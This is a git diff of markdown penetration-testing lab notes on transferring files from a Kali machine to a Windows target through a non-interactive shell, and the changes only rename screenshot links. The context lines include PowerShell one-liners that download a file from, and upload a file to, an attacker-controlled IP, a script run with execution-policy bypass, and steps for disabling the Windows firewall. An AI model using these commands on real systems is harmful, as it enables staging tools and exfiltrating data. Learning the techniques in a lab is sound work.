@@ -66,7 +66,7 @@ Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts
 ```
 
 We can then run the script with cscript and download files from our Kali machine's server.
-![[Pasted image 20220720022641.png]]
+![[cscript_wget.png]]
 
 **2.  Use PowerShell to transfer files in a non-interactive shell from Kali to Windows and vice versa.**
 
@@ -81,7 +81,7 @@ $webclient.DownloadFile($url,$file)
 This creates the wget.ps1 script. In order to run the script we must first enable the execution of PowerShell scripts. We can do this with the following command, including a few extra flags to set a few other options.
 `powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1`
 And we can see our file has downloaded.
-![[Pasted image 20220720024112.png]]
+![[new-exploit.png]]
 
 This script can be run in a number of ways. For example, a one liner version:
 `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.130/evil.txt', 'new-evil.txt')`
@@ -112,16 +112,16 @@ We can then place this file into our /var/www/WEBSITE_NAME directory, create a n
 We can now restart our apache server and use the IWR command to upload files. Once restarted, the following command will upload the file "evil_download.txt" to our /var/www/uploads folder:
 `powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'evil_download.txt')`
 And we can see the file on our Kali machine.
-![[Pasted image 20220721153421.png]]
+![[evil_download.png]]
 **4.  Use TFTP to transfer files from a non-interactive shell from Kali to Windows.**
 
 **Note:** If you encounter problems, first attempt the transfer process within an interactive shell and watch for issues that may cause problems in a non-interactive shell.
 
 We can see that when attempting to transfer a file via tftp on Windows we fail to get a connection and receive an error.
 
-![[Pasted image 20220721215649.png]]
+![[tftp_fail_firewall.png]]
 
 This is due to the firewall rules present on the Windows system. We can disable the firewall and attempt the transfer again.
-![[Pasted image 20220721220748.png]]
+![[firewall_disable.png]]
 And we can see the transfer is now successful.
-![[Pasted image 20220721220825.png]]
+![[tftp_success.png]]
